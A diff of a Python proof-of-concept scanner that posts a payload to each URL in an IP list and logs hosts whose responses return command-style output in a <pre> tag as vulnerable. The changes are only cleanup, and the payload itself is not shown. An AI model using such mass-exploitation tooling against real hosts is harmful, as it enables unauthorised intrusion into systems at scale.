@@ -6,7 +6,7 @@ vul_url = open("vul_url.txt", "w")
 
 
 def get_ip():
-    f = open("ip.txt", "r")    #ip list for example:http://192.168.1.2:8080/
+    f = open("ip.txt", "r") # ip格式为 http://192.168.2.2:8090/
     lines = f.readlines()
     ip_list = []
     for line in lines:
@@ -15,6 +15,7 @@ def get_ip():
         #if pattern.search(line):
         #line = line.replace("https", "http")
         ip_list.append(line)
+    f.close()
     return ip_list
 
 
@@ -31,16 +32,18 @@ def poc(ips):
         try:
             r = requests.post(url=url, data=payload, headers=headers, timeout=3)
             if "抱歉，您请求的页面出错啦！" in r.text:
-                print(url+"    失败")
+                print(url+" 失败")
                 pass
             else:
                 html = BeautifulSoup(r.content, "html.parser")
                 pre = html.find_all("pre")
                 if pre[0].text:
-                    print(url+"    "+pre[0].text)
-                    vul_url.write(url+pre[0].text+"\n")
+                    print(url+" "+pre[0].text.strip())
+                    vul_url.write(url+" "+pre[0].text.strip()+"\n")
         except:
+            print(url+" 访问异常")
             pass
+    vul_url.close()
 
 
 def test():
@@ -50,3 +53,4 @@ def test():
 if __name__ == "__main__":
     ip_ls = get_ip()
     poc(ip_ls)
+    # test()
